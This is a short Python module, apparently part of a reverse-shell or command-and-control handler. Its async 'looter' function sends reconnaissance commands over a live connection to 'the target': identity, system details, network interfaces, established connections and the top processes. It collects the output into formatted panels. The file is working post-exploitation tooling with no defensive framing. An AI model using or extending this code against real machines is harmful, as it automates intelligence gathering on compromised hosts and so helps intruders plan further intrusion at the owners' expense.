import asyncio
from rich.panel import Panel


async def run_looter(reader, writer):
    """
    Automated Intelligence Gathering (Async).
    Executes system recon commands remotely and returns formatted results.
    """
    results = []

    # List of commands to run on the target
    commands = [
        ("Identity", "whoami && id && hostname"),
        ("System Info", "uname -a"),
        ("Network", "ip addr || ifconfig"),
        ("Connections", "netstat -tunapl | grep ESTABLISHED"),
        ("Process List", "ps aux --sort=-%cpu | head -n 5")
    ]

    for title, cmd in commands:
        try:
            # Send command
            writer.write(f"{cmd}\n".encode())
            await writer.drain()

            # Read response with timeout
            data = await asyncio.wait_for(reader.read(4096), timeout=3.0)
            output = data.decode('utf-8', errors='ignore').strip()

            if output:
                results.append(f"[bold cyan]{title}:[/bold cyan]\n{output}")
        except asyncio.TimeoutError:
            results.append(f"[bold red]{title}:[/bold red]\n[Timeout]")
        except Exception as e:
            results.append(f"[bold red]{title}:[/bold red]\nError: {e}")

    return "\n\n".join(results)
